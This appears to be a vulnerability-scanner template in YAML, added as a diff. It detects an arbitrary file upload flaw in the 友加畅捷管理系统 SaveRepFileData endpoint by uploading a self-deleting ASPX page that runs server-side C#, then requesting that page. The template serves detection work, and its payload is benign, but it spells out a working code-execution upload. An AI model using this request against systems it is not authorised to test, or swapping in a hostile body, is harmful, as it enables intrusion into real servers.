@@ -1,0 +1,61 @@
+id: youjiasoft-saverepfiledata-anyfile-upload
+info:
+  name: 友加畅捷管理系统 SaveRepFileData 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects an arbitrary file upload vulnerability in the 友加畅捷管理系统 SaveRepFileData endpoint.
+
+variables:
+  t1: '{{rand_base(7)}}'
+  t2: '{{base64(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "/ReportDesign/RepFile.ashx?RepFile=pages/{{t1}}.aspx&Type=SaveRepFileData"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      <script runat="server" language="C#">
+          protected void Page_Load(object sender, EventArgs e)
+          {
+              Response.Write("{{t2}}");
+              string filePath = Server.MapPath(Request.ServerVariables["SCRIPT_NAME"]);
+              System.IO.File.Delete(filePath);
+              Response.End();
+          }
+      </script>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/Report/Pages/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
